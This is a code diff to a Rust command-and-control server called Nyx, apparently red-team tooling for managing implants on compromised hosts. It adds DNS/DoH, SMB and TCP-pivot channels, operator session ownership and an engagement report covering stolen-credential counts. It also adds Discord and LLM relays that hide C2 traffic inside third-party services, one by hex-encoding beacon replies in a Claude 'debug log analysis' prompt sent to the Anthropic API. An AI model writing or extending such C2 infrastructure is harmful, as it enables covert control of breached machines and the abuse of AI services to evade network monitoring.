@@ -7,10 +7,14 @@
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
 pub mod audit;
+pub mod dns_responder;
 pub mod extc2_relay;
 pub mod implant_gen;
 pub mod kernel;
 pub mod operators;
+#[cfg(windows)]
+pub mod smb_listener;
+pub mod tcp_pivot;
 pub mod tls;
 
 use std::sync::Arc;
@@ -96,6 +100,10 @@ pub struct Session {
     /// path. Kept on the Session so the throttle is per-session; 0 means "never
     /// flushed" so the first touch always goes through.
     pub persisted_last_touch: Instant,
+    /// Operator name who owns this session (set via `POST /api/session/owner`).
+    /// `None` = unowned. Persisted (schema v4) and restored on restart; the
+    /// beacon path never touches it.
+    pub owner: Option<String>,
 }
 
 pub struct AppState {
@@ -158,6 +166,11 @@ pub struct AppState {
     /// for that channel (the route still works as a plain beacon endpoint).
     /// See `extc2_relay.rs`.
     pub extc2: extc2_relay::ExtC2RelayConfig,
+    /// Authoritative DNS/DoH responder state for the DNS C2 channel
+    /// (`NYX_DOH_DOMAIN`). `None` when the DNS channel is not configured — the
+    /// `/dns-query` route and UDP responder are then not mounted at all (a
+    /// request gets a plain 404, the honest signal that the channel is off).
+    pub doh: Option<dns_responder::DohState>,
 }
 
 /// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
@@ -211,6 +224,7 @@ impl Default for AppState {
             implants: None,
             sessions_db: None,
             extc2: extc2_relay::ExtC2RelayConfig::default(),
+            doh: None,
         }
     }
 }
@@ -247,6 +261,11 @@ enum PersistCmd {
     /// Upsert full session metadata (new-session check-in). Carries the
     /// ORIGINAL `first_seen` so creation time survives re-check-ins.
     Upsert { rec: nyx_store::SessionRecord },
+    /// Operator-ownership change (`owner` = None clears).
+    SetOwner {
+        session_id: String,
+        owner: Option<String>,
+    },
     /// Bump only `last_seen` for an existing session (throttled per-session).
     Touch { session_id: String, last_seen: u64 },
     /// Persist the S2C send counter + C2S last-received counter after every
@@ -304,6 +323,12 @@ impl SessionPersistence {
         for cmd in rx {
             let (label, res) = match cmd {
                 PersistCmd::Upsert { rec } => ("upsert", store.upsert(&rec)),
+                PersistCmd::SetOwner { session_id, owner } => (
+                    "set_owner",
+                    store
+                        .update_owner(&session_id, owner.as_deref())
+                        .map(|_| ()),
+                ),
                 PersistCmd::Touch {
                     session_id,
                     last_seen,
@@ -349,6 +374,11 @@ impl SessionPersistence {
             session_id,
             last_seen,
         });
+    }
+
+    /// Fire-and-forget operator-ownership persistence.
+    pub fn set_owner(&self, session_id: String, owner: Option<String>) {
+        let _ = self.tx.send(PersistCmd::SetOwner { session_id, owner });
     }
 
     /// Fire-and-forget send/recv counter persistence (after each beacon frame).
@@ -454,6 +484,7 @@ pub fn load_persisted_sessions(state: &AppState) -> usize {
                 // was consumed at the original check-in; don't replay it.
                 auth_token: None,
             },
+            owner: r.owner.clone(),
             // Restore the send/recv counters persisted with the row (contract
             // 4) so BOTH counter spaces continue across a restart: the C2S
             // watermark (`last_recv`) keeps the anti-replay check continuous —
@@ -833,16 +864,14 @@ pub fn router(state: Arc<AppState>) -> Router {
     // LLM/MCP). The body IS the frame — identical to `/beacon` — so these routes
     // run the same beacon handler to decrypt, queue results, and seal a reply.
     //
-    // **Slack** and **MCP** routes go through [`extc2_relay_handler`], which
-    // additionally fans the sealed reply out to the real third-party API via
-    // the `nyx-transport` crate's `SlackTransport` / `McpTransport` (when the
-    // operator has configured `NYX_EXTC2_*`). That makes the server an actual
-    // external-C2 relay rather than just a URI alias for `/beacon`.
-    //
-    // **Discord** and **LLM** still delegate to the beacon path via
-    // [`extc2_alias_handler`], which logs a WARN so operators can see these
-    // plain-beacon aliases being used — there is no real third-party relay
-    // behind them yet (see design notes in `extc2_relay.rs`).
+    // **Slack / LLM / Discord / MCP** routes go through their relay handlers,
+    // which additionally fan the sealed reply out to the real third-party API
+    // via the `nyx-transport` crate's `SlackTransport` / `LlmApiTransport` /
+    // `DiscordTransport` / `McpTransport` (when the operator has configured
+    // the corresponding `NYX_EXTC2_*` vars). That makes the server an actual
+    // external-C2 relay rather than just a URI alias for `/beacon`. When a
+    // channel's relay is unconfigured its route degrades to a plain beacon
+    // endpoint (legacy behaviour).
     //
     // `/doh` is the DoH-channel beacon endpoint (spec-2). The DoH channel POSTs
     // the same encrypted frame as `/beacon` but to `/doh` (CS 4.11 DoH Beacon
@@ -853,9 +882,15 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/doh", post(beacon))
         .route("/dns", post(beacon))
         .route("/extc2/slack", post(extc2_relay_handler_slack))
-        .route("/extc2/discord", post(extc2_alias_handler))
-        .route("/extc2/llm", post(extc2_alias_handler))
+        .route("/extc2/discord", post(extc2_relay_handler_discord))
+        .route("/extc2/llm", post(extc2_relay_handler_llm))
         .route("/extc2/mcp", post(extc2_relay_handler_mcp));
+    // Authoritative DoH JSON endpoint (RFC 8484 dns-json), mounted only when
+    // the DNS channel is configured (NYX_DOH_DOMAIN). Without it a request
+    // gets a plain 404 — the honest signal that the channel is off.
+    if state.doh.is_some() {
+        beacon_routes = beacon_routes.route("/dns-query", post(dns_responder::doh_query_handler));
+    }
     let mut seen = std::collections::HashSet::new();
     for (uri, is_post) in extra {
         if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
@@ -885,6 +920,10 @@ pub fn router(state: Arc<AppState>) -> Router {
         .route("/api/creds/delete", post(delete_cred))
         .route("/api/audit", get(get_audit))
         .route("/api/audit/verify", get(verify_audit))
+        // Collaboration API (M3): session ownership, operator roster, report.
+        .route("/api/session/owner", post(set_session_owner))
+        .route("/api/operators", get(list_operators))
+        .route("/api/report", get(get_report))
         // Implant generation (requires NYX_TEMPLATE + implant store at runtime)
         .route("/api/generate-implant", post(implant_gen::generate_implant))
         .route("/api/implants", get(implant_gen::list_implants))
@@ -969,32 +1008,47 @@ async fn extc2_relay_handler_slack(
     }
 }
 
-/// External-C2 plain-beacon alias handler for the Discord / LLM routes.
-///
-/// These two services have NO third-party relay wired yet (see the design
-/// notes at the bottom of `extc2_relay.rs`), so `/extc2/discord` and
-/// `/extc2/llm` behave exactly like `/beacon`: decrypt → queue results → seal
-/// reply. That is indistinguishable from `/beacon` on the wire, so this
-/// handler logs a WARN on every use — an operator relying on Discord/LLM
-/// egress should SEE that the traffic is actually landing on the plain beacon
-/// endpoint (and that no third-party fan-out is happening) instead of
-/// believing the frame reached Discord/LLM.
-async fn extc2_alias_handler(
+/// External-C2 LLM relay handler. Same shape as [`extc2_relay_handler_slack`]
+/// but forwards the reply to the configured Anthropic LLM API via the shared
+/// boot-time transport stack (hex-encoded inside a Claude "debug log
+/// analysis" prompt). No-op when the LLM relay is unconfigured.
+async fn extc2_relay_handler_llm(
     State(st): State<Arc<AppState>>,
     ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
     method: Method,
     headers: HeaderMap,
     body: Bytes,
 ) -> Response {
-    tracing::warn!(
-        target: "nyx::extc2",
-        %peer,
-        "extc2 alias route used — no third-party relay behind this channel; processing as plain /beacon"
-    );
     match handle_beacon(&st, &peer, &method, &headers, &body) {
-        Ok(frame) => shape_beacon_response(&st, frame),
+        Ok(frame) => {
+            extc2_relay::relay_reply_to_llm(&st.extc2, frame.clone());
+            shape_beacon_response(&st, frame)
+        }
         Err(e) => {
-            tracing::warn!(error = %e, "extc2 alias beacon handler error");
+            tracing::warn!(error = %e, "extc2/llm beacon handler error");
+            StatusCode::BAD_REQUEST.into_response()
+        }
+    }
+}
+
+/// External-C2 Discord relay handler. Same shape as
+/// [`extc2_relay_handler_slack`] but forwards the reply to the configured
+/// Discord channel via the shared boot-time transport stack (base64 message
+/// content). No-op when the Discord relay is unconfigured.
+async fn extc2_relay_handler_discord(
+    State(st): State<Arc<AppState>>,
+    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
+    method: Method,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    match handle_beacon(&st, &peer, &method, &headers, &body) {
+        Ok(frame) => {
+            extc2_relay::relay_reply_to_discord(&st.extc2, frame.clone());
+            shape_beacon_response(&st, frame)
+        }
+        Err(e) => {
+            tracing::warn!(error = %e, "extc2/discord beacon handler error");
             StatusCode::BAD_REQUEST.into_response()
         }
     }
@@ -1478,6 +1532,7 @@ fn handle_new_session(
         ja3: fp.ja3,
         ja4: fp.ja4,
         stale: false,
+        owner: None,
         persisted_last_touch: Instant::now(),
     };
     // Atomically check-and-insert via `entry()`. This fully closes the
@@ -1541,6 +1596,9 @@ fn handle_new_session(
                         h.update(t);
                         h.finalize().to_vec()
                     }),
+                    // Operator ownership is set only via the ownership API;
+                    // a check-in never claims a session.
+                    owner: None,
                 });
             }
             // No tasks queued yet — reply with an empty batch.
@@ -1608,6 +1666,7 @@ fn handle_readmission(
         ja3: None,
         ja4: None,
         stale: false,
+        owner: None,
         persisted_last_touch: Instant::now(),
     };
     match st.sessions.entry(raw.pubkey) {
@@ -1807,7 +1866,7 @@ fn handle_existing_session(
 ///
 /// `raw_frame` is an already-parsed `RawFrame` (from `parse_frame`) — the caller
 /// is responsible for any channel-specific unwrapping before calling this.
-fn handle_frame(
+pub(crate) fn handle_frame(
     st: &AppState,
     peer: &std::net::SocketAddr,
     raw: &nyx_protocol::RawFrame,
@@ -1962,6 +2021,7 @@ async fn list_sessions(State(st): State<Arc<AppState>>, headers: HeaderMap) -> R
             ja3: entry.ja3.clone(),
             ja4: entry.ja4.clone(),
             stale: entry.stale,
+            owner: entry.owner.clone(),
         });
     }
     Json(out).into_response()
@@ -2829,6 +2889,179 @@ async fn get_profile(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Res
     Json(view).into_response()
 }
 
+// ---- Collaboration API (M3): ownership + operator roster + report ----------
+
+/// Request shape for `POST /api/session/owner`.
+#[derive(Deserialize)]
+struct OwnerReq {
+    session: String,
+    /// Operator name to assign; `null`/absent clears ownership.
+    owner: Option<String>,
+}
+
+/// Assign (or clear) the operator who owns a session. The assignment is
+/// audited with the acting operator's identity and persisted (schema v4) so
+/// it survives a server restart. The beacon path never touches `owner`, so a
+/// check-in cannot clobber an assignment.
+async fn set_session_owner(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Json(req): Json<OwnerReq>,
+) -> Response {
+    let op = match authenticate(&st, &headers) {
+        AuthOutcome::Allowed(o) => o,
+        AuthOutcome::Denied(r) => return r,
+    };
+    // Collaboration actions are not viewer work: read-only operators cannot
+    // claim sessions they may not be entitled to. Same deny-list pattern as
+    // the other write endpoints.
+    if op.role == operators::Role::Viewer {
+        return (
+            StatusCode::FORBIDDEN,
+            "forbidden: viewer role cannot assign session ownership",
+        )
+            .into_response();
+    }
+    let id = match parse_session_hex(&req.session) {
+        Some(id) => id,
+        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
+    };
+    // Normalize: an empty string means "clear" (operators can't be empty-named).
+    let owner = req.owner.filter(|o| !o.is_empty());
+    match st.sessions.get_mut(&id) {
+        Some(mut s) => {
+            s.owner = owner.clone();
+        }
+        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
+    }
+    // Persist fire-and-forget (same channel as the beacon-path writes).
+    if let Some(persist) = &st.sessions_db {
+        persist.set_owner(hex::encode(id), owner.clone());
+    }
+    if let Some(audit) = &st.audit {
+        audit.append(
+            "owner",
+            &op.name,
+            &req.session,
+            serde_json::json!({
+                "session": req.session,
+                "owner": owner,
+                "action": "assign",
+            }),
+        );
+    }
+    (StatusCode::OK, Json(serde_json::json!({ "ok": true }))).into_response()
+}
+
+/// Operator roster for the collaboration UI (ownership pickers etc.).
+/// Authenticated (viewer may read). Empty in open mode.
+async fn list_operators(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
+    let ops: Vec<serde_json::Value> = st
+        .operators
+        .roster()
+        .into_iter()
+        .map(|(name, role)| {
+            serde_json::json!({ "name": name, "role": serde_json::to_string(&role).unwrap_or_default().trim_matches('"').to_string() })
+        })
+        .collect();
+    Json(ops).into_response()
+}
+
+/// Markdown report snapshot of the engagement state (M3 报告闭环): sessions,
+/// credential vault, and the audit tail. Auth-gated (viewer may read the
+/// report — it contains no plaintext secrets; creds render as
+/// `realm/user/kind` only, never the secret).
+async fn get_report(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
+    let now_s = now_unix();
+    let mut md = String::new();
+    md.push_str(&format!(
+        "# Nyx engagement report\n\nGenerated: {now_s} (unix)\n\n"
+    ));
+
+    // Sessions.
+    md.push_str("## Sessions\n\n| host | user | os | arch | pid | owner | pending | age_s | stale |\n|---|---|---|---|---|---|---|---|---|\n");
+    let mut sessions: Vec<_> = st
+        .sessions
+        .iter()
+        .map(|e| {
+            let s = e.value();
+            (
+                hex::encode(e.key()),
+                s.info.hostname.clone(),
+                s.info.username.clone(),
+                s.info.os.clone(),
+                s.info.arch,
+                s.info.pid,
+                s.owner.clone(),
+                s.pending.len(),
+                s.created.elapsed().as_secs(),
+                s.stale,
+            )
+        })
+        .collect();
+    sessions.sort_by_key(|a| a.8);
+    for (id, host, user, os, arch, pid, owner, pending, age, stale) in sessions {
+        md.push_str(&format!(
+            "| {id:.8}… | {host} | {user} | {os} | {arch} | {pid} | {} | {pending} | {age} | {stale} |\n",
+            owner.as_deref().unwrap_or("-")
+        ));
+    }
+
+    // Credential vault (kinds + counts, NO secrets).
+    md.push_str("\n## Credential vault\n\n");
+    match st.creds.list() {
+        Ok(rows) => {
+            let mut by_kind: std::collections::BTreeMap<String, usize> =
+                std::collections::BTreeMap::new();
+            for r in &rows {
+                *by_kind.entry(format!("{:?}", r.kind)).or_default() += 1;
+            }
+            for (kind, n) in by_kind {
+                md.push_str(&format!("- {kind}: {n}\n"));
+            }
+            md.push_str(&format!(
+                "\nTotal: {} entries (secrets not exported)\n",
+                rows.len()
+            ));
+        }
+        Err(e) => md.push_str(&format!("cred store unavailable: {e}\n")),
+    }
+
+    // Audit tail (last 100 records).
+    md.push_str("\n## Audit tail\n\n");
+    if let Some(audit) = &st.audit {
+        let q = audit::AuditQuery {
+            limit: Some(100),
+            ..Default::default()
+        };
+        match audit.query(&q) {
+            Ok(records) => {
+                md.push_str("| ts | op | action | session |\n|---|---|---|---|\n");
+                for r in records.iter().rev().take(50) {
+                    md.push_str(&format!(
+                        "| {} | {} | {} | {} |\n",
+                        r.ts,
+                        r.operator,
+                        r.action,
+                        r.target.as_str()
+                    ));
+                }
+            }
+            Err(e) => md.push_str(&format!("audit unavailable: {e}\n")),
+        }
+    } else {
+        md.push_str("_no audit log configured_\n");
+    }
+
+    (StatusCode::OK, md).into_response()
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -3201,6 +3434,7 @@ mod tests {
                 last_seen: now_unix().saturating_sub(60),
                 send_counter: 0,
                 last_recv: 0,
+                owner: None,
                 auth_token: None,
             })
             .unwrap();
@@ -3244,6 +3478,7 @@ mod tests {
                 last_seen: now_unix().saturating_sub(50),
                 send_counter: 0,
                 last_recv: 0,
+                owner: None,
                 auth_token: None,
             })
             .unwrap();
@@ -3450,6 +3685,7 @@ mod tests {
                 last_seen: now_unix().saturating_sub(60),
                 send_counter: 17,
                 last_recv: 41,
+                owner: None,
                 auth_token: None,
             })
             .unwrap();
@@ -3765,6 +4001,7 @@ mod tests {
             ja3: None,
             ja4: None,
             stale: false,
+            owner: None,
             persisted_last_touch: Instant::now(),
         }
     }
